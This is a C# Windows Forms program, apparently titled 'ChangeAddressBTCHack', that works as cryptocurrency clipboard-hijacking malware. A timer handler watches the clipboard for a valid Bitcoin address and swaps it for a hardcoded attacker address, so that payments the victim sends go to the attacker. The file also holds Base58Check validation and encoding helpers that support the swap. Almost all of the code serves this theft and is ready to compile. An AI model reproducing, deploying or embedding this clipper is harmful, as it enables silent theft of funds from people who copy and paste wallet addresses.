using Org.BouncyCastle.Crypto.Digests;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace ChangeAddressBTCHack
{



    public partial class Form1 : Form
    {

        string BTC_ADDRESS_HACK = "1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX";
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label(String value)
        {
            label1.Text = value ;            
            this.Refresh();
            this.Show();
            System.Threading.Thread.Sleep(1000);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    if (Validator.IsValidAddress(Clipboard.GetText()) && Clipboard.GetText() != BTC_ADDRESS_HACK)
                    {                        
                        label("Found Address!");
                        Clipboard.Clear();
                        Clipboard.SetText("1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX");
                        label("Change Address...");
                        label("Scan Clipboard...");                        
                    }
                }
            }
            catch { }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }



    public class Validator
    {
        public static bool IsValidAddress(string Address)
        {
            byte[] hex = Base58CheckToByteArray(Address);
            if (hex == null || hex.Length != 21)
                return false;
            else
                return true;
        }

        public static byte[] Base58CheckToByteArray(string base58)
        {

            byte[] bb = Base58.ToByteArray(base58);
            if (bb == null || bb.Length < 4) return null;

            Sha256Digest bcsha256a = new Sha256Digest();
            bcsha256a.BlockUpdate(bb, 0, bb.Length - 4);

            byte[] checksum = new byte[32];
            bcsha256a.DoFinal(checksum, 0);
            bcsha256a.BlockUpdate(checksum, 0, 32);
            bcsha256a.DoFinal(checksum, 0);

            for (int i = 0; i < 4; i++)
            {
                if (checksum[i] != bb[bb.Length - 4 + i]) return null;
            }

            byte[] rv = new byte[bb.Length - 4];
            Array.Copy(bb, 0, rv, 0, bb.Length - 4);
            return rv;
        }

    }

    public class Base58
    {
        /// <summary>
        /// Converts a base-58 string to a byte array, returning null if it wasn't valid.
        /// </summary>
        public static byte[] ToByteArray(string base58)
        {
            Org.BouncyCastle.Math.BigInteger bi2 = new Org.BouncyCastle.Math.BigInteger("0");
            string b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

            foreach (char c in base58)
            {
                if (b58.IndexOf(c) != -1)
                {
                    bi2 = bi2.Multiply(new Org.BouncyCastle.Math.BigInteger("58"));
                    bi2 = bi2.Add(new Org.BouncyCastle.Math.BigInteger(b58.IndexOf(c).ToString()));
                }
                else
                {
                    return null;
                }
            }

            byte[] bb = bi2.ToByteArrayUnsigned();

            // interpret leading '1's as leading zero bytes
            foreach (char c in base58)
            {
                if (c != '1') break;
                byte[] bbb = new byte[bb.Length + 1];
                Array.Copy(bb, 0, bbb, 1, bb.Length);
                bb = bbb;
            }

            return bb;
        }

        public static string FromByteArray(byte[] ba)
        {
            Org.BouncyCastle.Math.BigInteger addrremain = new Org.BouncyCastle.Math.BigInteger(1, ba);

            Org.BouncyCastle.Math.BigInteger big0 = new Org.BouncyCastle.Math.BigInteger("0");
            Org.BouncyCastle.Math.BigInteger big58 = new Org.BouncyCastle.Math.BigInteger("58");

            string b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

            string rv = "";

            while (addrremain.CompareTo(big0) > 0)
            {
                int d = Convert.ToInt32(addrremain.Mod(big58).ToString());
                addrremain = addrremain.Divide(big58);
                rv = b58.Substring(d, 1) + rv;
            }

            // handle leading zeroes
            foreach (byte b in ba)
            {
                if (b != 0) break;
                rv = "1" + rv;

            }
            return rv;
        }

    }
}
